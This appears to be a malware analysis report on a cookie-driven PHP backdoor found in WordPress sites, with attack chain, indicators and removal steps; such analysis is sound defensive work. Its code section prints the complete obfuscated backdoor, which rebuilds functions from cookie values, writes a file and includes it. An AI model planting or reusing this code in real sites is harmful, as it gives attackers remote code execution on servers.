---
title: 'Cookie-Based PHP Execution Malware'
slug: 'cookie-based-php-execution-malware'
metaDescription: 'Deep dive into Cookie-Based PHP Backdoors. Learn how hackers use $_COOKIE to execute arbitrary code in .htaccess and PHP files, and how to remove this zero-day threat.'
reportDate: '2026-01-24'
threatType: 'PHP Backdoor'
severity: 'High'
fileHash: 'htaccess-v2'
detectedPaths: ['sample.txt']
screenshots: ['/images/wordpress-threats/htaccess-v2_evidence-1.png']
vtLink: 'https://www.virustotal.com/gui/home/upload'
vtScore: 'Zero-Day (Unique)'
impact: 'This type of malware poses a significant security risk as it allows execution of arbitrary PHP code, potentially leading to unauthorized access or server compromise.'
seenOn: "Web root or '.htaccess' files"
behavior: 'Executes arbitrary code using cookies, can redirect or block site access.'
difficulty: 'Moderate'
recurrence: 'Medium'
numberOfSiteFixed: 'Not specified by user'
---

## Technical Analysis

The malicious script is a PHP backdoor that utilizes cookies to execute arbitrary PHP code. The script reads input from the '$\_COOKIE' superglobal and expects a specific structure where certain indices in the cookies contain character sequences that are pieced together to form PHP code. This code is then executed by including it as a PHP file. Such malware can be embedded in '.htaccess' files to serve redirects or execute malicious scripts, as highlighted in the user context.

> **VirusTotal Analysis:** üõ°Ô∏è **Zero-Day / Fully Undetected.**

## Attack Chain

1. Step 1: PHP script checks the '$\_COOKIE' superglobal for a certain format.
2. Step 2: It assembles code from specific cookie values.
3. Step 3: The assembled code is executed by inclusion.

## Code Signature(s)

### FILE: `sample.php`

```php
<?php $c = $_COOKIE; $k = 0; $n = 5; $p = array(); $p[$k] = ''; while($n) { $p[$k] .= $c[36][$n]; if(!$c[36][$n+1]) { if(!$c[36][$n+2]) break; $k++; $p[$k] = ''; $n++; } $n = $n + 5 + 1; } $k = $p[0]() . $p[25]; if(!$p[18]($k)) { $n = $p[1]($k, $p[8]); $p[14]($n, $p[2] . $p[9]($p[7]($c[3]))); } include($k);
```

## Indicators of Compromise (IOCs)

- `$_COOKIE`
- `include($k)`
- `$c[36][$n]`

## Removal Protocol

1. Step 1: Locate and open the affected '.htaccess' or PHP files in the web directory.
1. Step 2: Remove the malicious PHP code snippet from these files.
1. Step 3: Clear all cookies in the attacker logic or reset cookie-related scripts.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
